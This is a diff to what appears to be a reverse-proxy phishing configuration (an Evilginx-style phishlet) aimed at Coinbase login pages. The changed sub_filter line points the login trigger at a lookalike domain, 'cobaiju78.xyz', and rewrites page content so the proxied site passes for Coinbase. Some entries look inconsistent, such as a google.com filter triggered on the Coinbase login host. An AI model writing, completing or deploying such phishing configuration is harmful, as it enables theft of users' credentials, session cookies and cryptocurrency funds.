@@ -9,7 +9,7 @@ proxy_hosts:
 
 
 sub_filters:
-  - {triggers_on: 'login.coinbase.com', orig_sub: 'login', domain: 'coinbase.com', search: 'coinbase.com', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript'], redirect_only: false}
+  - {triggers_on: 'login.cobaiju78.xyz', orig_sub: 'login', domain: 'cobaiju78.xyz', search: '{hostname_regexp}', replace: 'coinbase', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript'], redirect_only: false}
   - {triggers_on: 'www', orig_sub: 'www', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'accounts', orig_sub: 'accounts', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.coinbase.com', orig_sub: 'login', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
